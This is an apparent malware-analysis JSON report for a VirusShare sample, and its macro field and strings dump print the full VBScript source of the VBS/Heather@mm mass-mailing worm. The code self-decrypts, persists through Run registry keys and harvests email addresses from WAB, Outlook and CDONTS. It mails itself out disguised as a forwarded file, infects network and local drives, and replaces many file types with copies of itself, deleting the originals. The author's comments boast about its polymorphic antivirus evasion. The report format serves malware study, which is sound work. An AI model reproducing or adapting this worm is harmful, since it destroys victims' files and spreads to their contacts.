{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "RegRead": "May read registry keys",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file",
            "register": "May call a DLL using Excel 4 Macros",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "Rem VBS/Heather@mm by FSo.\nRem Haven't you AVers realized yet that your heuristics suck?\nRem To all the creators out there, keep it alive...\nRem Greets and Thanks:\nRem Zulu - Thanks just for the encouragment and putting up with me.\nRem S@t@n!k Ch!ld - Damn this fuckin' DSL...! (boom)\nRem CyberWarrior - 'Why do you want it so bad, it just uses some stupid DOS features...'\nRem Sugien - 'I don't want my 15 minutes or even 15 seconds of fame...' (Bullshit!)\nRem Nick Fitzgerald - Please stay; I love your outbursts!\nRem Mike Bleiweiss - I agree!  acvsc needs more flame wars!\nRem Blooven - Pathetic little twerp.  But, anyway, thanks for giving me my hourly laugh.\nRem\tBTW you are so stupid, writing viruses is not illegal!\nOn Error Resume Next\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet ScrBuf = FSO.OpenTextFile(WScript.ScriptFullName)\nVirusBuff = ScrBuf.ReadAll\nScrBuf.Close\nVirusBuff = Replace(VirusBuff, Chr(39), \"\")\nEndStr = \"Rem <--- Exit Heather\"\nVirBegin = InStr(1, VirusBuff, \"Rem VBS/Heather@mm by FSo.\")\nVirusLoc = InStr(1, VirusBuff, EndStr)\nVirusLoc2 = InStr(VirusLoc + Len(EndStr), VirusBuff, EndStr) + VirusLoc + (Len(EndStr) * 2) - VirBegin\nCryptStr = \"Rem <--- Begin Crypt\"\nCryptLoc = InStr(1, VirusBuff, CryptStr)\nCryptLoc2 = InStr(CryptLoc + Len(CryptStr), VirusBuff, CryptStr) + CryptLoc + (Len(CryptStr) * 2) + 2\nNCryptBuff = Mid(VirusBuff, 1, CryptLoc2 - 4)\nCryptBuff = Mid(VirusBuff, CryptLoc2, VirusLoc2 - CryptLoc2)\nSeed = Asc(Mid(CryptBuff, 1, 1)) - Asc(\"R\")\nIf Seed = 0 Then GoTo SkipCrypt\nFor CryptLen = 1 To Len(CryptBuff)\n\tCryptChar = Asc(Mid(CryptBuff, X, 1)) - Seed\n\tIf CryptChar < 0 Then\n\t\tCryptChar = 255 - Abs(CryptChar)\n\tEnd If\n\tExecuteBuff = ExecuteBuff&Chr(CryptChar)\nNext\nExecute ExecuteBuff\nSkipCrypt:\nRem <--- Begin Crypt\n\nRem Pretty complicated decryptor.  I required the decryptor in this worm to be dynamic because \nRem the poly engine changes the size up and down (not just up like some of that crap!)\n\nCall EncryptCode\nSet WshShell = CreateObject(\"WScript.Shell\")\nIf WshShell.RegRead(\"HKLM\\Heather\\\") = \"Makes Me Complete\" Then GoTo AlreadyDidMachine\nCall PolyCode\nRandomize\nSsf = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\\"\nintSpf = Int(Rnd * 150)\nIf intSpf = 1 Then\n\tSpf = FSO.GetSpecialFolder(0)\nElseIf intSpf = 2 Then\n\tSpf = FSO.GetSpecialFolder(1)\nElseIf intSpf = 3 Then\n\tSpf = FSO.GetSpecialFolder(2)\nElseIf intSpf = 4 Then\n\tSpf = \"C:\\RECYCLED\"\nElseIf intSpf = 5 Then\n\tSpf = WshShell.RegRead(Ssf&\"AppData\")\nElseIf intSpf = 6 Then\n\tSpf = WshShell.RegRead(Ssf&\"Cache\")\nElseIf intSpf = 7 Then\n\tSpf = WshShell.RegRead(Ssf&\"Cookies\")\nElseIf intSpf = 8 Then\n\tSpf = WshShell.RegRead(Ssf&\"Fonts\")\nElseIf intSpf = 9 Then\n\tSpf = WshShell.RegRead(Ssf&\"NetHood\")\nElseIf intSpf = 10 Then\n\tSpf = WshShell.RegRead(Ssf&\"PrintHood\")\nElse\n\tSpf = WshShell.RegRead(Ssf&\"Templates\")\nEnd If\nFileLen = Int(Rnd * 8) + 1\nFor FileChars = 1 To FileLen\n\tFileVar = FileVar&Chr(Int(Rnd * 26) + 64)\nNext\nRegBase = FileVar\nFileVar = Spf&\"\\\"&FileVar\nSet ShellFile = FSO.CreateTextFile(FileVar, True)\nShellFile.Write NCryptBuffer&vbCrLf&CryptBuffer\nShellFile.Close\nFSO.GetFile(FileVar).Attributes = 39\nRegKey = Int(Rnd * 4) + 1\nIf RegKey = 1 Then\n\tKey = \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"\nElseIf RegKey = 2 Then\n\tKey = \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\\"\nElseIf RegKey = 3 Then\n\tKey = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"\nElse\n\tKey = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\\"\nEnd If\nWshShell.RegWrite Key&RegBase, FileVar\n\nRem Very advanced code to register worm as a shell service.  That'll jack up the removal ratings\nRem a bit...\n\nAlreadyDidMachine:\nSet WshNetwork = CreateObject(\"WScript.Network\")\nSet WNEnum = WshNetwork.EnumNetworkDrives\nFor NetNum = 0 To WNEnum.Count - 2 Step 2\n\tInfectFiles(NetNum.Item&\"\\\")\nNext\n\nRem Enumerate networked devices (even unmapped ones) and use their UNC names as an infection path\n\nIf WshShell.RegRead(\"HKLM\\SOFTWARE\\Miss Arnote\\\") = \"Captivates...\" Then GoTo SkipMail\nAppData = WshShell.RegRead(Ssf&\"AppData\")\nFor Each MSWab In FSO.GetFolder(AppData&\"\\Microsoft\\Address Book\").Files\n\tIf UCase(FSO.GetExtensionName(MSWab.Path)) = \"WAB\" Then\n\t\tWabFile = MSWab.Path\n\t\tExit For\n\tEnd If\nNext\nIf WabFile = \"\" Then GoTo SkipWab\nSet WabOpen = FSO.OpenTextFile(WabFile)\nWabBuff = WabOpen.ReadAll\nstrFindAt = 1\nstrOldAddr = 1\nDo While Null = Null\n\tstrFindAt = InStr(strOldAddr, WabBuff, \"@\")\n\tIf strFindAt = 0 Then Exit Do\n\tAddyBuff = \"\"\n\tstrChar = 1\n\tDo While Null = Null\n\t\tszChar = Mid(WabBuff, strFindAt - strChar, 1)\n\t\tIf Not szChar = Chr(0) Then\n\t\t\tAddyBuff = szChar&AddyBuff\n\t\t\tstrChar = strChar + 1\n\t\tElse\n\t\t\tExit Do\n\t\tEnd If\n\tLoop\n\tstrChar = 1\n\tDo While Null = Null\n\t\tszChar = Mid(WabBuff, strFindAt - strChar, 1)\n\t\tIf Not szChar = Chr(0) Then\n\t\t\tAddyBuff = AddyBuff&szChar\n\t\t\tstrChar = strChar + 1\n\t\tElse\n\t\t\tExit Do\n\t\tEnd If\n\tLoop\n\tIf InStr(1, AddyString, AddyBuff) = 0 Then AddrBuff = AddyString&AddyBuff&\"; \"\n\tstrFindAt = strFindAt + strChar + 1\nLoop\nWabOpen.Close\n\nRem Interesting hack for getting addresses from WAB address books in the background.  I created\nRem this sucker because I was sick and tired of using DDE to exploit Outlook Express/WAB stuff.\nRem Thanks to Satanik Child for idea of OE spreading.  Idea on getting addresses from WAB based\nRem on Win32.Magistr worm.\n\nSet MSOutlook = CreateObject(\"Outlook.Application\")\nSet OutlMapi = MSOutlook.GetNameSpace(\"MAPI\")\nFor FldrCnt = 1 To OutlMapi.Folders.Count\n\tIf FldrCnt = 2 Then GoTo SkipFldr\n\tFor Each OutlItem Is OutlMapi.Folders(FldrCnt).Items\n\t\tFor Each VirRecip In OutlItem.Recipients\n\t\t\tIf InStr(1, AddrString, VirRecip.Address) = 0 Then AddrString = AddrString&VirRecip.Address&\"; \"\n\t\tNext\n\tNext\nSkipFldr:\nNext\nFor Each OutlBook In OutlMapi.AddressLists\n\tFor Each OutlCntct In OutlBook.AddressEntries\n\t\tIf InStr(1, AddrString, OutlCntct.Address) = 0 Then AddrString = AddrString&OutlCntct.Address&\"; \"\n\tNext\nNext\n\nRem Get even more e-mail addresses by flipping through the user's MS Outlook folders, and address\nRem book.\n\nSet CdoMapi = CreateObject(\"CDONTS.Session\")\nCdoMapi.LogonSMTP\nFor Each InboxCdo In CdoMapi.Inbox.Messages\n\tFor Each CdoRecip In InboxCdo.Recipients\n\t\tIf InStr(1, CdoRecip.Address, AddrString) = 0 Then AddrString = AddrString&CdoRecip.Address&\" ;\"\n\tNext\nNext\n\nRem Get some addresses from the Inbox of the CDONTS e-mail service, which ships with MS IIS.\n\nIf Not MSOutlook Is Nothing Then\n\tbIsOutlook = True\nElseIf Not CdoMapi Is Nothing Then\n\tbIsOutlook = False\nElse\n\tGoTo SkipMail\nEnd If\n\nRem Decide course of action for e-mail propogation.\n\nRcntFldr = WshShell.RegRead(Ssf&\"Recent\")\nFor Each RcntFile In FSO.GetFolder(RcntFldr).Files\n\tRcntPath = Mid(RcntFile.Name, 1, Len(RcntFile.Name) - InStrRev(RcntFile.Name, \".\") - 1)\n\tRcntExt = UCase(Right(RcntPath, InStrRev(RcntPath, \".\") - 1))\n\tIf RcntExt = \"DOC\" Or RcntExt = \"DOT\" Or RcntExt = \"MP3\" Or RcntExt = \"WAV\" Or RcntExt = \"XLS\" Or RcntExt = \"PPT\" Or RcntExt = \"RTF\" Or RcntExt = \"TXT\" Or RcntExt = \"HTM\" Or RcntExt = \"HTML\" Or RcntExt = \"XLS\" Then\n\t\tRcntName = RcntPath\n\t\tRcntSubj = RcntPath\n\t\tRcntText = RcntPath&\" - Cool file, got this one from a friend.  You'll love it.\"\n\t\tExit For\n\tEnd If\nNext\nIf RcntName = \"\" Then RcntName = \"HEATHER.JPG\"\nIf RcntSubj = \"\" Then RcntSubj = \"Awesome Pic!\"\nIf RcntText = \"\" Then RcntName = \">Now here is one beautiful lady...\"\nRcntName = RcntName&\".vbs\"\nRandomize\nFwStyle = Int(Rnd * 3) + 1\nIf FwStyle = 1 Then\n\tRcntSubj = \"Fw: \"&RcntSubj\nElseIf FwStyle = 2 Then\n\tRcntSubj = \"Fwd: \"&RcntSubj\nEnd If\nCall PolyCode\nRealRcnt = FSO.GetSpecialFolder(0)&\"\\\"&RcntName\nSet VirusAttach = FSO.CreateTextFile(RealRcnt, True)\nVirusAttach.Write NCryptBuff&vbCrLf&CryptBuff\nVirusAttach.Close\n\nRem On the fly generation of viral message (pieces based on VBS/Stages and VBS/NewLove)\nRem Uses a file from Recent as a base (as NewLove did) and chooses \"Fw: \" crap at random (As did\nRem Stages).\n\nIf bIsOutlook Then\n\tSet MsgItem = MSOutlook.CreateItem(0)\nElse\n\tSet MsgItem = CdoMapi.Outbox.Messages.Add\nEnd If\nMsgItem.BCC = AddyString\nMsgItem.Subject = RcntSubj\nMsgItem.Attachments.Add(RealRcnt)\nIf bIsOutlook Then MsgItem.DeleteAfterSubmit = True\nMsgItem.Send\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Miss Arnote\\\", \"Captivates...\"\n\nRem Send e-mail using CDONTS/Outlook if present.\n\nSkipMail:\nFor Each FsoDrive In FSO.Drives\n\tnum = num + InfectFiles(FsoDrive.Path&\"\\\", num)\nNext\n\nRem Search the system for appropriate files, and infect.\n\nWshShell.Popup \"Dedicated to Heather Arnote, who has set a wonderful example for us all.\"&vbCrLf&\"Thanks, to people like Heather for upholding the spirit of society in such a corrupt place.\"&vbCrLf&\"Evolution is necessary for survival.  If you do not evolve, you die.  If this society holds on to its 18th century beliefs, in this, the 21st century, a world nuked to the bone with cyber and physical threats, it too will die.\"&vbCrLf&\"Sadly to say, it is already withering...  Like an old rose... And it eventually, will die.\"&vbCrLf&\"And as you can see the inability of 18th century ideals to combat this threat, what is our future?\"&vbCrLf&\"When computers will be in household appliances, and appliances will be linked to the world.\"&vbCrLf&\"Will we have hack attacks on toaster ovens?\"&vbCrLf&\"Just some food for thought.\"&vbCrLf&vbCrLf&\"VBS/Heather is copyright (c), FileSystemObject, July 2001.\"&vbCrLf&\"I'm sorry, but \"&CStr(num)\" of your files have been infected or destroyed.  I hope you enjoy restoring them as much as I enjoyed writing this!\"&vbCrLf&vbCrLf&\"Once again, food for thought...  How can a world that is repeatedly brought to its knees by simple pieces of script survive when everything will be connected.  Do you want to live like this?\", 0, \"A Message from FileSystemObject\", \n\nFunction InfectFiles(fspec, num)\nOn Error Resume Next\nFor Each FsoFile In FSO.GetFolder(fspec).Files\n\tFileExt = UCase(FSO.GetExtensionName(FsoFile.Path))\n\tFilePath = FsoFile.Path\n\tIf Extn = \"AIF\" Or Extn = \"AIFF\" Or Extn = \"AIFC\" Or Extn = \"ARC\" Or Extn = \"ARJ\" Or Extn = \"ASF\" Or Extn = \"ASP\" Or Extn = \"AVI\" Or Extn = \"BKS\" Or Extn = \"BMP\" Or Extn = \"CAB\" Or Extn = \"CHM\" Or Extn = \"CSS\" Or Extn = \"DAT\" Or Extn = \"DIB\" Or Extn = \"DOT\" Or Extn = \"DOC\" Or Extn = \"WLL\" Or Extn = \"WIZ\" Or Extn = \"EML\" Or Extn = \"FDF\" Or Extn = \"GIF\" Or Extn = \"GZ\" Or Extn = \"HLP\" Or InStr(1, Extn, \"HT\") > 0 Or Extn = \"INF\" Or Extn = \"IVF\" Or Extn = \"JFIF\" Or Extn = \"JPG\" Or Extn = \"JPE\" Or Extn = \"JPEG\" Or Extn = \"JS\" Or Extn = \"JSE\" Or Extn = \"LHA\" Or Extn = \"LOG\" Or Extn = \"LZH\" Or Extn = \"M1V\" Or Extn = \"M3U\" Or Extn = \"MAPIMAIL\" Or Extn = \"MBF\" Or Extn = \"MID\" Or Extn = \"MIDI\" Or Extn = \"MIDS\" Or Extn = \"MIM\" Or Extn = \"MIZ\" Or Extn = \"MJF\" Or Extn = \"MNY\" Or Extn = \"MOD\" Or Extn = \"MOV\" Or Mid(Extn, 1, 2) = \"MP\" Or Extn = \"MSG\" Or Extn = \"MSI\" Or Extn = \"MSP\" Or Extn = \"MSS\" Or Extn = \"MTM\" Or Extn = \"MUS\" Or Extn = \"MZIP\" Or Extn = \"NST\" Or Extn = \"NWS\" Or Extn = \"OCX\" Or Ext = \"OBD\" Or Extn = \"OFC\" \tOr Extn = \"OFX\" Or Extn = \"PDF\" Or Extn = \"PNG\" Or Extn = \"POT\" Or Extn = \"PPS\" Or Extn = \"PPT\" Or Mid(Extn, 1, 2) = \"QD\" Or Extn = \"QIF\" Or Extn = \"QWB\" Or Extn = \"RAR\" Or Extn = \"REG\" Or Extn = \"RMI\" Or Extn = \"RTF\" Or Extn = \"S3M\" Or Extn = \"SCT\" Or Extn = \"SHB\" Or Extn = \"SHS\" Or Extn = \"SND\" Or Extn = \"TAR\" Or Extn = \"TAZ\" Or Extn = \"TGZ\" Or Extn = \"TIF\" Or Extn = \"TIFF\" Or Extn = \"TLB\" Or Extn = \"TXT\" Or Extn = \"TZ\" Or Extn = \"UU\" Or Extn = \"UUE\" Or Extn = \"WAB\" Or Extn = \"WAV\" Or Extn = \"WDB\" Or Extn = \"WKS\" Or Extn = \"WMP\" Or Extn = \"MPP\" Or Extn = \"MPT\" Or Extn = \"WRI\" Or Extn = \"WSC\" Or Extn = \"WSF\" Or Extn = \"WSH\" Or Extn = \"XML\" Or Extn = \"XSL\" Or Mid(Extn, 1, 2) = \"XL\" Then\n\t\tSet VbsReplace = FSO.CreateTextFile(FilePath&\".vbs\")\n\t\tCall PolyCode\n\t\tVbsReplace.Write NCryptBuff&vbCrLf&CryptBuff\n\t\tVbsReplace.Close\n\t\tFSO.DeleteFile FsoFile.Path\n\t\tnum = num + 1\n\nRem Damage routine.  This will add a \".vbs\" to a number of different extensions and infect that\nRem new file with the worm, after which it will delete the original.  Many files will not be able\nRem to be recovered.\n\n\tElseIf Extn = \"VBE\" Then\n\t\tSet ReadVictim = FSO.OpenTextFile(FilePath)\n\t\tszVbe = ReadVictim.ReadAll\n\t\tszFindVir = InStr(1, szVbe, \"Rem VBS/Heather@mm by FSo.\")\n\t\tReadVictim.Close\n\t\tIf szFindVir = 0 Then\n\t\t\tCall PolyCode\n\t\t\tSet VbeWrite = FSO.CreateTextFile(FilePath, True)\n\t\t\tVbeWrite.Write NCryptBuff&vbCrLf&CryptBuff&vbCrLf&szVbe\n\t\t\tVbeWrite.Close\n\t\tEnd If\n\t\tnum = num + 1\n\nRem VBE infection.  Infect by prepending (any other way you get an error, kinda stupid!)\n\n\tElseIf Extn = \"VBS\" Or Extn = \"WSF\" Then\n\t\tSet ReadVbsVictim = FSO.OpenTextFile(FilePath)\n\t\tszVbs = ReadVbsVictim.ReadAll\n\t\tszFindVbsVir = InStr(1, szVbs, \"Rem VBS/Heather@mm by FSo.\")\n\t\tVbsSplit() = Split(szVbs, vbCrLf)\n\t\tNumOfLines = UBound(VbsSplit)\n\t\tReadVbsVictim.Close\n\t\tIf szFindVbsVir = 0 Then\n\t\t\tRandomize\n\t\t\tLineNum = Int(Rnd * NumOfLines) + 1\n\t\t\tIf Extn = \"WSF\" And LineNum < 4 Then LineNum = 4\n\t\t\tSet WriteVbs = FSO.CreateTextFile(FilePath, True)\n\t\t\tFor SplitCount = 0 To LineNum - 1\n\t\t\t\tWriteVbs.WriteLine VbsSplit(SplitCount)\n\t\t\tNext\n\t\t\tCall PolyCode\n\t\t\tWriteVbs.WriteLine NCryptBuff&vbCrLf&CryptBuff\n\t\t\tFor SplitCount = LineNum To UBound(VbsSplit)\n\t\t\t\tWriteVbs.WriteLine VbsSplit(SplitCount)\n\t\t\tNext\n\t\tEnd If\n\t\tnum = num + 1\n\tEnd If\nNext\nInfectFiles = num\nEnd Sub\n\nRem Interesting hack on VBS/WSF infection.  I could have made it EPO, but the jump would have\nRem defeated the purpose of mid-file insertion: disguise, and to beat heuristics.  The EPO jump\nRem would go immediately to our virus code.  This would look suspicious because a decryptor in\nRem the middle of a file, pointed to by a GoTo would just be weird.  Also, the user would surely\nRem see an inserted goto immediately, unless they had like a page of comments (and even that may\nRem not hide it!)\n\nSub EncryptCode()\nOn Error Resume Next\nRandomize\nSeed = Int(Rnd * 254) + 1\nCryptBuff = Replace(CryptBuff, Chr(39), \"\")\nFor CryptoLen = 1 To Len(CryptBuff)\n\tChAsc = Asc(Chr(Mid(CryptBuff, CryptoLen, 1))) + Seed\n\tIf ChAsc > 255 Then\n\t\tChAsc = ChAsc - 255\n\tEnd If\n\tIf ChAsc = 10 Or ChAsc = 13 Then NewCrypt = NewCrypt&Chr(39)\n\tNewCrypt = NewCrypt&Chr(ChAsc)\nNext\nCryptBuff = Chr(39)&CryptBuff\nEnd Sub\n\nRem Polymorphic encyptor.  Chooses a random seed and uses ASCII char table to encode all chars in\nRem the virus body that need to be encoded (i.e, not the decryptor!)\n\nSub PolyCode()\nOn Error Resume Next\nPolyArr(96) = Array(\"FSO\", \"ScrBuf\", \"VirusBuff\", \"EndStr\", \"VirusLoc\", \"VirusLoc2\", \"CryptStr\", \"CryptLoc\", \"CryptLoc2\", \"NCryptBuff\", \"CryptBuff\", \"Seed\", \"CryptLen\", \"ExecuteBuff\", \"SkipCrypt\", \"PolyArr\", \"PolyLen\", \"NameLen\", \"NewVar\", \"CharCount\", \"CharType\", \"CharCase\", \"PolyCode\", \"EncryptCode\", \"CryptoLen\", \"ChAsc\", \"NewCrypt\", \"WshShell\", \"Ssf\", \"intSpf\", \"FileLen\", \"FileChars\", \"FileVar\", \"RegBase\", \"WshNetwork\", \"WNEnum\", \"NetNum\", \"InfectFiles\", \"SkipMail\", \"CacheFldr\", \"AddyString\", \"AppData\", \"MSWab\", \"WabFile\", \"WabOpen\", \"WabBuff\", \"strFindAt\", \"strOldAddr\", \"AddyBuff\", \"strChar\", \"szChar\", \"MSOutlook\", \"OutlMapi\", \"FldrCnt\", \"SkipFldr\", \"OutlItem\", \"VirRecip\", \"OutlBook\", \"OutlCntct\", \"CdoMapi\", \"InboxCdo\", \"CdoRecip\", \"bIsOutlook\", \"RcntFldr\", \"RcntFile\", \"RcntPath\", \"RnctExt\", \"RcntName\", \"RcntSubj\", \"RcntText\", \"FwStyle\", \"RealRcnt\", \"VirusAttach\", \"MsgItem\", \"FsoDrive\", \"InfectFiles\", \"fspec\", \"num\", \"FsoFile\", \"FileExt\", \"FilePath\", \"Extn\", \"VbsReplace\", \"ReadVictim\", \"szVbe\", \"szFindVir\", \"ReadVictim\", \"VbeWrite\", \"szVbs\", \"szFindVbsVir\", \"ReadVbsVictim\", \"VbsSplit\", \"NumOfLines\", \"LineNum\", \"WriteVbs\", \"SplitCount\")\nRandomize\nFor PolyLen = 0 To UBound(PolyArr)\n\tNewVar = \"\"\n\tNameLen = Int(Rnd * 10) + 5\n\tFor CharCount = 1 To NameLen\n\t\tCharType = Int(Rnd * 2) + 1\n\t\tIf CharType = 1 Then\n\t\t\tNewVar = NewVar&CStr(Int(Rnd * 10))\n\t\tElse\n\t\t\tCharCase = Int(Rnd * 2) + 1\n\t\t\tChar = Int(Rnd * 26) + 64\n\t\t\tIf CharCase = 1 Then\n\t\t\t\tNewVar = NewVar&UCase(Chr(Char))\n\t\t\tElse\n\t\t\t\tNewVar = NewVar&LCase(Chr(Char))\n\t\t\tEnd If\n\t\tEnd If\n\tNext\n\tNCryptBuff = Replace(NCryptBuff, PolyArr(PolyLen), NewVar)\n\tExecuteBuff = Replace(ExecuteBuff, PolyArr(PolyLen), NewVar)\nNext\nEnd Sub\n\nRem Poly engine.  This drastically changes the size of the virus with every infection.  Another\nRem awesome advantage of this is that the virus will be reported as 'No Remover Available' or a\nRem similar thing by AVs, especially being it inserts itself in a random location in infected \nRem VBS, and WSF files.  (inserts at beginning of VBE, else you get an error on run.)"
    },
    "filename": "VirusShare_3925747aac20edc1c442cc8fd2720654",
    "filesize": 16869,
    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "3925747aac20edc1c442cc8fd2720654",
        "sha1": "4ed93d8082f07eeccbcfed312c7ee9f8ec72a19c",
        "sha256": "b27a2041f81229a50c97919dc1ad39e57bd46538b916eb344aac04717c9e0905"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Rem VBS/Heather@mm by FSo.",
            "Rem Haven't you AVers realized yet that your heuristics suck?",
            "Rem To all the creators out there, keep it alive...",
            "Rem Greets and Thanks:",
            "Rem Zulu - Thanks just for the encouragment and putting up with me.",
            "Rem S@t@n!k Ch!ld - Damn this fuckin' DSL...! (boom)",
            "Rem CyberWarrior - 'Why do you want it so bad, it just uses some stupid DOS features...'",
            "Rem Sugien - 'I don't want my 15 minutes or even 15 seconds of fame...' (Bullshit!)",
            "Rem Nick Fitzgerald - Please stay; I love your outbursts!",
            "Rem Mike Bleiweiss - I agree!  acvsc needs more flame wars!",
            "Rem Blooven - Pathetic little twerp.  But, anyway, thanks for giving me my hourly laugh.",
            "Rem\tBTW you are so stupid, writing viruses is not illegal!",
            "On Error Resume Next",
            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
            "Set ScrBuf = FSO.OpenTextFile(WScript.ScriptFullName)",
            "VirusBuff = ScrBuf.ReadAll",
            "ScrBuf.Close",
            "VirusBuff = Replace(VirusBuff, Chr(39), \"\")",
            "EndStr = \"Rem <--- Exit Heather\"",
            "VirBegin = InStr(1, VirusBuff, \"Rem VBS/Heather@mm by FSo.\")",
            "VirusLoc = InStr(1, VirusBuff, EndStr)",
            "VirusLoc2 = InStr(VirusLoc + Len(EndStr), VirusBuff, EndStr) + VirusLoc + (Len(EndStr) * 2) - VirBegin",
            "CryptStr = \"Rem <--- Begin Crypt\"",
            "CryptLoc = InStr(1, VirusBuff, CryptStr)",
            "CryptLoc2 = InStr(CryptLoc + Len(CryptStr), VirusBuff, CryptStr) + CryptLoc + (Len(CryptStr) * 2) + 2",
            "NCryptBuff = Mid(VirusBuff, 1, CryptLoc2 - 4)",
            "CryptBuff = Mid(VirusBuff, CryptLoc2, VirusLoc2 - CryptLoc2)",
            "Seed = Asc(Mid(CryptBuff, 1, 1)) - Asc(\"R\")",
            "If Seed = 0 Then GoTo SkipCrypt",
            "For CryptLen = 1 To Len(CryptBuff)",
            "\tCryptChar = Asc(Mid(CryptBuff, X, 1)) - Seed",
            "\tIf CryptChar < 0 Then",
            "\t\tCryptChar = 255 - Abs(CryptChar)",
            "\tEnd If",
            "\tExecuteBuff = ExecuteBuff&Chr(CryptChar)",
            "Next",
            "Execute ExecuteBuff",
            "SkipCrypt:",
            "Rem <--- Begin Crypt",
            "Rem Pretty complicated decryptor.  I required the decryptor in this worm to be dynamic because ",
            "Rem the poly engine changes the size up and down (not just up like some of that crap!)",
            "Call EncryptCode",
            "Set WshShell = CreateObject(\"WScript.Shell\")",
            "If WshShell.RegRead(\"HKLM\\Heather\\\") = \"Makes Me Complete\" Then GoTo AlreadyDidMachine",
            "Call PolyCode",
            "Randomize",
            "Ssf = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\\"",
            "intSpf = Int(Rnd * 150)",
            "If intSpf = 1 Then",
            "\tSpf = FSO.GetSpecialFolder(0)",
            "ElseIf intSpf = 2 Then",
            "\tSpf = FSO.GetSpecialFolder(1)",
            "ElseIf intSpf = 3 Then",
            "\tSpf = FSO.GetSpecialFolder(2)",
            "ElseIf intSpf = 4 Then",
            "\tSpf = \"C:\\RECYCLED\"",
            "ElseIf intSpf = 5 Then",
            "\tSpf = WshShell.RegRead(Ssf&\"AppData\")",
            "ElseIf intSpf = 6 Then",
            "\tSpf = WshShell.RegRead(Ssf&\"Cache\")",
            "ElseIf intSpf = 7 Then",
            "\tSpf = WshShell.RegRead(Ssf&\"Cookies\")",
            "ElseIf intSpf = 8 Then",
            "\tSpf = WshShell.RegRead(Ssf&\"Fonts\")",
            "ElseIf intSpf = 9 Then",
            "\tSpf = WshShell.RegRead(Ssf&\"NetHood\")",
            "ElseIf intSpf = 10 Then",
            "\tSpf = WshShell.RegRead(Ssf&\"PrintHood\")",
            "Else",
            "\tSpf = WshShell.RegRead(Ssf&\"Templates\")",
            "End If",
            "FileLen = Int(Rnd * 8) + 1",
            "For FileChars = 1 To FileLen",
            "\tFileVar = FileVar&Chr(Int(Rnd * 26) + 64)",
            "Next",
            "RegBase = FileVar",
            "FileVar = Spf&\"\\\"&FileVar",
            "Set ShellFile = FSO.CreateTextFile(FileVar, True)",
            "ShellFile.Write NCryptBuffer&vbCrLf&CryptBuffer",
            "ShellFile.Close",
            "FSO.GetFile(FileVar).Attributes = 39",
            "RegKey = Int(Rnd * 4) + 1",
            "If RegKey = 1 Then",
            "\tKey = \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"",
            "ElseIf RegKey = 2 Then",
            "\tKey = \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\\"",
            "ElseIf RegKey = 3 Then",
            "\tKey = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"",
            "Else",
            "\tKey = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\\"",
            "End If",
            "WshShell.RegWrite Key&RegBase, FileVar",
            "Rem Very advanced code to register worm as a shell service.  That'll jack up the removal ratings",
            "Rem a bit...",
            "AlreadyDidMachine:",
            "Set WshNetwork = CreateObject(\"WScript.Network\")",
            "Set WNEnum = WshNetwork.EnumNetworkDrives",
            "For NetNum = 0 To WNEnum.Count - 2 Step 2",
            "\tInfectFiles(NetNum.Item&\"\\\")",
            "Next",
            "Rem Enumerate networked devices (even unmapped ones) and use their UNC names as an infection path",
            "If WshShell.RegRead(\"HKLM\\SOFTWARE\\Miss Arnote\\\") = \"Captivates...\" Then GoTo SkipMail",
            "AppData = WshShell.RegRead(Ssf&\"AppData\")",
            "For Each MSWab In FSO.GetFolder(AppData&\"\\Microsoft\\Address Book\").Files",
            "\tIf UCase(FSO.GetExtensionName(MSWab.Path)) = \"WAB\" Then",
            "\t\tWabFile = MSWab.Path",
            "\t\tExit For",
            "\tEnd If",
            "Next",
            "If WabFile = \"\" Then GoTo SkipWab",
            "Set WabOpen = FSO.OpenTextFile(WabFile)",
            "WabBuff = WabOpen.ReadAll",
            "strFindAt = 1",
            "strOldAddr = 1",
            "Do While Null = Null",
            "\tstrFindAt = InStr(strOldAddr, WabBuff, \"@\")",
            "\tIf strFindAt = 0 Then Exit Do",
            "\tAddyBuff = \"\"",
            "\tstrChar = 1",
            "\tDo While Null = Null",
            "\t\tszChar = Mid(WabBuff, strFindAt - strChar, 1)",
            "\t\tIf Not szChar = Chr(0) Then",
            "\t\t\tAddyBuff = szChar&AddyBuff",
            "\t\t\tstrChar = strChar + 1",
            "\t\tElse",
            "\t\t\tExit Do",
            "\t\tEnd If",
            "\tLoop",
            "\tstrChar = 1",
            "\tDo While Null = Null",
            "\t\tszChar = Mid(WabBuff, strFindAt - strChar, 1)",
            "\t\tIf Not szChar = Chr(0) Then",
            "\t\t\tAddyBuff = AddyBuff&szChar",
            "\t\t\tstrChar = strChar + 1",
            "\t\tElse",
            "\t\t\tExit Do",
            "\t\tEnd If",
            "\tLoop",
            "\tIf InStr(1, AddyString, AddyBuff) = 0 Then AddrBuff = AddyString&AddyBuff&\"; \"",
            "\tstrFindAt = strFindAt + strChar + 1",
            "Loop",
            "WabOpen.Close",
            "Rem Interesting hack for getting addresses from WAB address books in the background.  I created",
            "Rem this sucker because I was sick and tired of using DDE to exploit Outlook Express/WAB stuff.",
            "Rem Thanks to Satanik Child for idea of OE spreading.  Idea on getting addresses from WAB based",
            "Rem on Win32.Magistr worm.",
